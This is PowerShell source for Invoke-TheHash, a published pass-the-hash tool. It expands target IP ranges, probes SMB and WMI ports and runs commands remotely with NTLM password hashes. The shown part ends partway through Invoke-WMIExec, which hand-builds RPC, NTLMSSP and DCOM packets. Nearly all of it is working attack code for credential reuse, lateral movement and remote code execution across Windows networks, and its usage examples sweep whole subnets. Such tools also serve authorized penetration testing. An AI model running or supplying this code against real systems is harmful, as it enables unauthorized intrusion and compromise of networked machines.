function Invoke-TheHash
{
<#
.SYNOPSIS
Invoke-TheHash has the ability to target multiple hosts with Invoke-SMBExec or Invoke-WMIExec. This function is
primarily for checking a hash against multiple systems. The function can also be used to perform other tasks
against multiple hosts. 

Author: Kevin Robertson (@kevin_robertson)  
License: BSD 3-Clause 

.PARAMETER Type
(SMBClient/SMBEnum/SMBExec/WMIExec) Sets the desired Invoke-TheHash function.

.PARAMETER Target
List of hostnames, IP addresses, CIDR notation, or IP ranges for targets.

.PARAMETER TargetExclude
List of hostnames, IP addresses, CIDR notation, or IP ranges to exclude form the list or targets. Note that the
format (hostname vs IP address) must match the format used with the Targets parameter. For example, if the host
was added to Targets within a CIDR notation, it must be excluded as an IP address and not a host name.

.PARAMETER PortCheckDisable
(Switch) Disable WMI or SMB port check. Since this function is not yet threaded, the port check serves to speed up
the function by checking for an open WMI or SMB port before attempting a full synchronous TCPClient connection.

.PARAMETER PortCheckTimeout
Default = 100: Set the no response timeout in milliseconds for the WMI or SMB port check.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will just check to see if the username and hash has access to WMI on the target.

.PARAMETER CommandCOMSPEC
Default = Enabled: SMBExec type only. Prepend %COMSPEC% /C to Command.

.PARAMETER Action
(All,Group,NetSession,Share,User) Default = Share: SMBEnum enumeration action to perform.

.PARAMETER Group
Default = Administrators: Group to enumerate with SMBEnum.

.PARAMETER Service
Default = 20 Character Random: SMBExec type only. Name of the service to create and delete on the target.

.PARAMETER Sleep
Default = WMI 10 Milliseconds, SMB 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.EXAMPLE
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
Invoke-TheHash -Type SMBExec -Target 192.168.100.1-100 -TargetExclude 192.168.100.50 -Username user1 -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -domain test

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$true)][Array]$Target,
    [parameter(Mandatory=$false)][Array]$TargetExclude,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][ValidateSet("All","NetSession","Share","User","Group")][String]$Action = "All",
    [parameter(Mandatory=$false)][String]$Group = "Administrators",
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(Mandatory=$true)][ValidateSet("SMBClient","SMBEnum","SMBExec","WMIExec")][String]$Type,
    [parameter(Mandatory=$false)][Int]$PortCheckTimeout = 100,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$PortCheckDisable,
    [parameter(Mandatory=$false)][Int]$Sleep
)

$target_list = New-Object System.Collections.ArrayList
$target_exclude_list = New-Object System.Collections.ArrayList

if($Type -eq 'WMIExec')
{
    $Sleep = 10
}
else
{
    $Sleep = 150
}

for($i=0;$i -lt $target.Count;$i++)
{

    if($target[$i] -like "*-*")
    {
        $target_array = $target[$i].split("-")

        if($target_array[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
        $target_array[1] -notmatch "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
        {

            if($target_array.Count -ne 2 -or $target_array[1] -notmatch "^[\d]+$" -or $target_array[1] -gt 254)
            {
                Write-Output "[!] Invalid target $($target[$i])"
                throw
            }
            else
            {
                $IP_network_begin = $target_array[0].ToCharArray()
                [Array]::Reverse($IP_network_begin)
                $IP_network_begin = -join($IP_network_begin)
                $IP_network_begin = $IP_network_begin.SubString($IP_network_begin.IndexOf("."))
                $IP_network_begin = $IP_network_begin.ToCharArray()
                [Array]::Reverse($IP_network_begin)
                $IP_network_begin = -join($IP_network_begin)
                $IP_range_end = $IP_network_begin + $target_array[1]
                $target[$i] = $target_array[0] + "-" + $IP_range_end
            }

        }

    }

}

# math taken from https://gallery.technet.microsoft.com/scriptcenter/List-the-IP-addresses-in-a-60c5bb6b

function Convert-RangetoIPList
{
    param($IP,$CIDR,$Start,$End)

    function Convert-IPtoINT64
    { 
        param($IP) 
        
        $octets = $IP.split(".")

        return [int64]([int64]$octets[0] * 16777216 + [int64]$octets[1]*65536 + [int64]$octets[2] * 256 + [int64]$octets[3]) 
    } 
    
    function Convert-INT64toIP
    { 
        param ([int64]$int) 
        return (([math]::truncate($int/16777216)).tostring() + "." +([math]::truncate(($int%16777216)/65536)).tostring() + "." + ([math]::truncate(($int%65536)/256)).tostring() + "." +([math]::truncate($int%256)).tostring())
    }

    $target_list = New-Object System.Collections.ArrayList
    
    if($IP)
    {
        $IP_address = [System.Net.IPAddress]::Parse($IP)
    }

    if($CIDR)
    {
        $mask_address = [System.Net.IPAddress]::Parse((Convert-INT64toIP -int ([convert]::ToInt64(("1" * $CIDR + "0" * (32 - $CIDR)),2))))
    }

    if($IP)
    {
        $network_address = New-Object System.Net.IPAddress ($mask_address.address -band $IP_address.address)
    }

    if($IP)
    {
        $broadcast_address = New-Object System.Net.IPAddress (([System.Net.IPAddress]::parse("255.255.255.255").address -bxor $mask_address.address -bor $network_address.address))
    } 
    
    if($IP)
    { 
        $start_address = Convert-IPtoINT64 -ip $network_address.IPAddressToString
        $end_address = Convert-IPtoINT64 -ip $broadcast_address.IPAddressToString
    }
    else
    { 
        $start_address = Convert-IPtoINT64 -ip $start 
        $end_address = Convert-IPtoINT64 -ip $end 
    } 
    
    for($i = $start_address; $i -le $end_address; $i++) 
    { 
        $IP_address = Convert-INT64toIP -int $i
        $target_list.Add($IP_address) > $null
    }

    if($network_address)
    {
        $target_list.Remove($network_address.IPAddressToString)
    }

    if($broadcast_address)
    {
        $target_list.Remove($broadcast_address.IPAddressToString)
    }
    
    return $target_list
}

function Get-TargetList
{
    param($targets)

    $target_list = New-Object System.Collections.ArrayList

    ForEach($entry in $targets)
    {
        $entry_split = $null

        if($entry.contains("/"))
        {
            $entry_split = $entry.Split("/")
            $IP = $entry_split[0]
            $CIDR = $entry_split[1]
            $target_list.AddRange($(Convert-RangetoIPList -IP $IP -CIDR $CIDR))
        }
        elseif($entry.contains("-"))
        {
            $entry_split = $entry.Split("-")

            if($entry_split[0] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b" -and
            $entry_split[1] -match "\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b")
            {
                $start_address = $entry_split[0]
                $end_address = $entry_split[1]
                $target_list.AddRange($(Convert-RangetoIPList -Start $start_address -End $end_address))
            }
            else
            {
                $target_list.Add($entry) > $null    
            }
            
        }
        else
        {
            $target_list.Add($entry) > $null
        }

    }

    return $target_list
}

[Array]$target_list = Get-TargetList $Target

if($TargetExclude)
{
    $target_exclude_list = Get-TargetList $TargetExclude
    $target_list = Compare-Object -ReferenceObject $target_exclude_list -DifferenceObject $target_list -PassThru
}

if($target_list.Count -gt 0)
{

    foreach($target_host in $target_list)
    {
        Write-Verbose "[*] Targeting $target_host"

        if($type -eq 'WMIExec')
        {

            if(!$PortCheckDisable)
            {
                $WMI_port_test = New-Object System.Net.Sockets.TCPClient
                $WMI_port_test_result = $WMI_port_test.BeginConnect($target_host,"135",$null,$null)
                $WMI_port_test_success = $WMI_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
                $WMI_port_test.Close()
            }

            if($WMI_port_test_success -or $PortCheckDisable)
            {
                Invoke-WMIExec -username $Username -domain $Domain -hash $Hash -command $Command -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
            }

        }
        elseif($Type -like 'SMB*')
        {

            if(!$PortCheckDisable)
            {
                $SMB_port_test = New-Object System.Net.Sockets.TCPClient
                $SMB_port_test_result = $SMB_port_test.BeginConnect($target_host,"445",$null,$null)
                $SMB_port_test_success = $SMB_port_test_result.AsyncWaitHandle.WaitOne($PortCheckTimeout,$false)
                $SMB_port_test.Close()
            }

            if($SMB_port_test_success -or $PortCheckDisable)
            {

                switch($Type)
                {

                    'SMBClient'
                    {

                        $source = "\\" + $target_host + "\c$"

                        if($PsCmdlet.ParameterSetName -eq 'Auth')
                        {
                            Invoke-SMBClient -username $Username -domain $Domain -hash $Hash -source $source -sleep $Sleep -Verbose:$VerbosePreference
                        }
                        else
                        {
                            Invoke-SMBClient -source $source -sleep $Sleep -Verbose:$VerbosePreference
                        }

                    }

                    'SMBEnum'
                    {

                        if($PsCmdlet.ParameterSetName -eq 'Auth')
                        {
                            Invoke-SMBEnum -username $Username -domain $Domain -hash $Hash -target $target_host -sleep $Sleep -Action $Action -TargetShow -Verbose:$VerbosePreference
                        }
                        else
                        {
                            Invoke-SMBEnum -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
                        }

                    }

                    'SMBExec'
                    {

                        if($PsCmdlet.ParameterSetName -eq 'Auth')
                        {
                            Invoke-SMBExec -username $Username -domain $Domain -hash $Hash -command $Command -CommandCOMSPEC $CommandCOMSPEC -Service $Service -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
                        }
                        else
                        {
                            Invoke-SMBExec -target $target_host -sleep $Sleep -Verbose:$VerbosePreference
                        }

                    }

                }

            }

        }

    }
     
}
else
{
    Write-Output "[-] Target list is empty"    
}

}






function Invoke-WMIExec
{
<#
.SYNOPSIS
Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.

Author: Kevin Robertson (@kevin_robertson)  
License: BSD 3-Clause 

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after
the username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will just check to see if the
username and hash has access to WMI on the target.

.PARAMETER Sleep
Default = 10 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.EXAMPLE
Execute a command.
Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.EXAMPLE
Check command execution privilege.
Invoke-WMIExec -Target 192.168.100.20 -Username administrator -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Int]$Sleep=10
)

if($Command)
{
    $WMI_execute = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#RPC

function New-PacketRPCBind
{
    param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCBind.Add("Version",[Byte[]](0x05))
    $packet_RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCBind.Add("PacketType",[Byte[]](0x0b))
    $packet_RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCBind.Add("FragLength",[Byte[]](0x48,0x00))
    $packet_RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("CallID",$packet_call_ID_bytes)
    $packet_RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCBind.Add("NumCtxItems",$packet_num_ctx_items)
    $packet_RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCBind.Add("ContextID",$packet_context_ID)
    $packet_RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $packet_RPCBind.Add("Unknown2",[Byte[]](0x00))
    $packet_RPCBind.Add("Interface",$packet_UUID)
    $packet_RPCBind.Add("InterfaceVer",$packet_UUID_version)
    $packet_RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($packet_num_ctx_items[0] -eq 2)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($packet_num_ctx_items[0] -eq 3)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("InterfaceVer2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $packet_RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown4",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface3",[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        $packet_RPCBind.Add("InterfaceVer3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x04))
        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("ContextID4",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    if($packet_call_ID -eq 3)
    {
        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $packet_RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
        $packet_RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }

    return $packet_RPCBind
}

function New-PacketRPCAUTH3
{
    param([Byte[]]$packet_NTLMSSP)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length)[0,1]
    [Byte[]]$packet_RPC_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 28)[0,1]

    $packet_RPCAuth3 = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAuth3.Add("Version",[Byte[]](0x05))
    $packet_RPCAuth3.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCAuth3.Add("PacketType",[Byte[]](0x10))
    $packet_RPCAuth3.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCAuth3.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("FragLength",$packet_RPC_length)
    $packet_RPCAuth3.Add("AuthLength",$packet_NTLMSSP_length)
    $packet_RPCAuth3.Add("CallID",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAuth3.Add("AuthType",[Byte[]](0x0a))
    $packet_RPCAuth3.Add("AuthLevel",[Byte[]](0x02))
    $packet_RPCAuth3.Add("AuthPadLength",[Byte[]](0x00))
    $packet_RPCAuth3.Add("AuthReserved",[Byte[]](0x00))
    $packet_RPCAuth3.Add("ContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCAuth3.Add("NTLMSSP",$packet_NTLMSSP)

    return $packet_RPCAuth3
}

function New-PacketRPCRequest
{
    param([Byte[]]$packet_flags,[Int]$packet_service_length,[Int]$packet_auth_length,[Int]$packet_auth_padding,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_opnum,[Byte[]]$packet_data)

    if($packet_auth_length -gt 0)
    {
        $packet_full_auth_length = $packet_auth_length + $packet_auth_padding + 8
    }

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_service_length + 24 + $packet_full_auth_length + $packet_data.Length)
    [Byte[]]$packet_frag_length = $packet_write_length[0,1]
    [Byte[]]$packet_alloc_hint = [System.BitConverter]::GetBytes($packet_service_length + $packet_data.Length)
    [Byte[]]$packet_auth_length = [System.BitConverter]::GetBytes($packet_auth_length)[0,1]

    $packet_RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCRequest.Add("Version",[Byte[]](0x05))
    $packet_RPCRequest.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketType",[Byte[]](0x00))
    $packet_RPCRequest.Add("PacketFlags",$packet_flags)
    $packet_RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCRequest.Add("FragLength",$packet_frag_length)
    $packet_RPCRequest.Add("AuthLength",$packet_auth_length)
    $packet_RPCRequest.Add("CallID",$packet_call_ID)
    $packet_RPCRequest.Add("AllocHint",$packet_alloc_hint)
    $packet_RPCRequest.Add("ContextID",$packet_context_ID)
    $packet_RPCRequest.Add("Opnum",$packet_opnum)

    if($packet_data.Length)
    {
        $packet_RPCRequest.Add("Data",$packet_data)
    }

    return $packet_RPCRequest
}

function New-PacketRPCAlterContext
{
    param([Byte[]]$packet_assoc_group,[Byte[]]$packet_call_ID,[Byte[]]$packet_context_ID,[Byte[]]$packet_interface_UUID)

    $packet_RPCAlterContext = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCAlterContext.Add("Version",[Byte[]](0x05))
    $packet_RPCAlterContext.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("PacketType",[Byte[]](0x0e))
    $packet_RPCAlterContext.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCAlterContext.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("FragLength",[Byte[]](0x48,0x00))
    $packet_RPCAlterContext.Add("AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("CallID",$packet_call_ID)
    $packet_RPCAlterContext.Add("MaxXmitFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("MaxRecvFrag",[Byte[]](0xd0,0x16))
    $packet_RPCAlterContext.Add("AssocGroup",$packet_assoc_group)
    $packet_RPCAlterContext.Add("NumCtxItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCAlterContext.Add("ContextID",$packet_context_ID)
    $packet_RPCAlterContext.Add("NumTransItems",[Byte[]](0x01))
    $packet_RPCAlterContext.Add("Unknown2",[Byte[]](0x00))
    $packet_RPCAlterContext.Add("Interface",$packet_interface_UUID)
    $packet_RPCAlterContext.Add("InterfaceVer",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCAlterContext.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCAlterContext.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    return $packet_RPCAlterContext
}

function New-PacketNTLMSSPVerifier
{
    param([Int]$packet_auth_padding,[Byte[]]$packet_auth_level,[Byte[]]$packet_sequence_number)

    $packet_NTLMSSPVerifier = New-Object System.Collections.Specialized.OrderedDictionary

    if($packet_auth_padding -eq 4)
    {
        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x04
    }
    elseif($packet_auth_padding -eq 8)
    {
        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x08
    }
    elseif($packet_auth_padding -eq 12)
    {
        $packet_NTLMSSPVerifier.Add("AuthPadding",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]$packet_auth_pad_length = 0x0c
    }
    else
    {
        [Byte[]]$packet_auth_pad_length = 0x00
    }

    $packet_NTLMSSPVerifier.Add("AuthType",[Byte[]](0x0a))
    $packet_NTLMSSPVerifier.Add("AuthLevel",$packet_auth_level)
    $packet_NTLMSSPVerifier.Add("AuthPadLen",$packet_auth_pad_length)
    $packet_NTLMSSPVerifier.Add("AuthReserved",[Byte[]](0x00))
    $packet_NTLMSSPVerifier.Add("AuthContextID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierVersionNumber",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierChecksum",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPVerifier.Add("NTLMSSPVerifierSequenceNumber",$packet_sequence_number)

    return $packet_NTLMSSPVerifier
}

function New-PacketDCOMRemQueryInterface
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IID)

    $packet_DCOMRemQueryInterface = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemQueryInterface.Add("VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemQueryInterface.Add("VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemQueryInterface.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("CausalityID",$packet_causality_ID)
    $packet_DCOMRemQueryInterface.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("IPID",$packet_IPID)
    $packet_DCOMRemQueryInterface.Add("Refs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("IIDs",[Byte[]](0x01,0x00))
    $packet_DCOMRemQueryInterface.Add("Unknown",[Byte[]](0x00,0x00,0x01,0x00,0x00,0x00))
    $packet_DCOMRemQueryInterface.Add("IID",$packet_IID)

    return $packet_DCOMRemQueryInterface
}

function New-PacketDCOMRemRelease
{
    param([Byte[]]$packet_causality_ID,[Byte[]]$packet_IPID,[Byte[]]$packet_IPID2)

    $packet_DCOMRemRelease = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemRelease.Add("VersionMajor",[Byte[]](0x05,0x00))
    $packet_DCOMRemRelease.Add("VersionMinor",[Byte[]](0x07,0x00))
    $packet_DCOMRemRelease.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("CausalityID",$packet_causality_ID)
    $packet_DCOMRemRelease.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("Unknown",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("InterfaceRefs",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("IPID",$packet_IPID)
    $packet_DCOMRemRelease.Add("PublicRefs",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("PrivateRefs",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("IPID2",$packet_IPID2)
    $packet_DCOMRemRelease.Add("PublicRefs2",[Byte[]](0x05,0x00,0x00,0x00))
    $packet_DCOMRemRelease.Add("PrivateRefs2",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_DCOMRemRelease
}

function New-PacketDCOMRemoteCreateInstance
{
    param([Byte[]]$packet_causality_ID,[String]$packet_target)

    [Byte[]]$packet_target_unicode = [System.Text.Encoding]::Unicode.GetBytes($packet_target)
    [Byte[]]$packet_target_length = [System.BitConverter]::GetBytes($packet_target.Length + 1)
    $packet_target_unicode += ,0x00 * (([Math]::Truncate($packet_target_unicode.Length / 8 + 1) * 8) - $packet_target_unicode.Length)
    [Byte[]]$packet_cntdata = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 720)
    [Byte[]]$packet_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 680)
    [Byte[]]$packet_total_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 664)
    [Byte[]]$packet_private_header = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 40) + 0x00,0x00,0x00,0x00
    [Byte[]]$packet_property_data_size = [System.BitConverter]::GetBytes($packet_target_unicode.Length + 56)

    $packet_DCOMRemoteCreateInstance = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_DCOMRemoteCreateInstance.Add("DCOMVersionMajor",[Byte[]](0x05,0x00))
